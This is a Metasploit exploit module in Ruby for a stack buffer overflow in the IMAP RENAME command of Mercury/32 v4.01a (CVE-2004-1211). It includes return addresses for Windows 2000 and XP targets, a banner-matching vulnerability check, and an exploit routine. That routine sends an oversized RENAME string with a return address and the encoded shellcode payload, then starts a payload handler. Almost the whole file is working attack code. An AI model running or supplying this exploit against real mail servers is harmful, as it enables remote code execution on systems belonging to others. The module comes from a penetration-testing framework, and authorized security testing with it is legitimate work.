##
# $Id: mercury_rename.rb 9262 2010-05-09 17:45:00Z jduck $
##

##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
##

require \'msf/core\'

class Metasploit3 < Msf::Exploit::Remote
	Rank = AverageRanking

	include Msf::Exploit::Remote::Imap

	def initialize(info = {})
		super(update_info(info,
			\'Name\'           => \'Mercury/32 v4.01a IMAP RENAME Buffer Overflow\',
			\'Description\'    => %q{
					This module exploits a stack buffer overflow vulnerability in the
				Mercury/32 v.4.01a IMAP service.
			},
			\'Author\'         => [ \'MC\' ],
			\'License\'        => MSF_LICENSE,
			\'Version\'        => \'$Revision: 9262 $\',
			\'References\'     =>
				[
					[ \'CVE\', \'2004-1211\'],
					[ \'OSVDB\', \'12508\'],
					[ \'BID\', \'11775\'],
					[ \'NSS\', \'15867\'],
				],
			\'Privileged\'     => true,
			\'DefaultOptions\' =>
				{
					\'EXITFUNC\' => \'process\',
				},
			\'Payload\'        =>
				{
					\'Space\'    => 500,
					\'BadChars\' => \"\\x00\\x0a\\x0d\\x20\",
					\'StackAdjustment\' => -3500,
				},
			\'Platform\'       => \'win\',
			\'Targets\'        =>
				[
					[\'Windows 2000 SP4 English\',   { \'Ret\' => 0x7846107b }],
					[\'Windows XP Pro SP0 English\', { \'Ret\' => 0x77dc0df0 }],
					[\'Windows XP Pro SP1 English\', { \'Ret\' => 0x77e53877 }],
				],
			\'DisclosureDate\' => \'Nov 29 2004\'))
	end

	def check
		connect
		resp = sock.get_once
		disconnect

		if (resp =~ /Mercury\\/32 v4\\.01a/)
			return Exploit::CheckCode::Vulnerable
		end
			return Exploit::CheckCode::Safe
	end

	def exploit
		connect_login

		sploit =  \"a001 RENAME \" + rand_text_alpha_upper(260)
		sploit << [target.ret].pack(\'V\') + payload.encoded

		sock.put(sploit)

		handler
		disconnect
	end

end
